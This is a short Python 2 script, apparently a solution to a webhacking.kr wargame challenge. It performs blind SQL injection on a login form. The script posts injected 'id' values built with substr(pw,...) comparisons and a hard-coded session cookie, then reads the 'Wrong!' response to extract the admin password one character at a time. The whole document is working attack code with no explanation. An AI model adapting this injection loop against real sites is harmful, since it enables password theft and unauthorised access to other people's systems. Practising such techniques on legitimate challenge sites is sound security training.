import requests

url = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php'
#data = 'id=admin \' and substr(pw,1,1)='
data = {'id' : 'admin \' and substr(pw,1,1)='}
cookies = {'PHPSESSID' : 'jkjivvneaac91tlk8t10ti22m4'}

key = ''
for j in xrange(33):
    for i in xrange(0x10,0x80):
        value = 'admin \' and substr(pw,' + str(j) + ',1)=' + str(hex(i)) + '#'
        data = {'id' : value}
        print data
        response = requests.post(url, cookies=cookies, data=data)
        if 'Wrong!' not in response.text:
            key = key + chr(i)
            print key
            break
print 'Password : ' + key
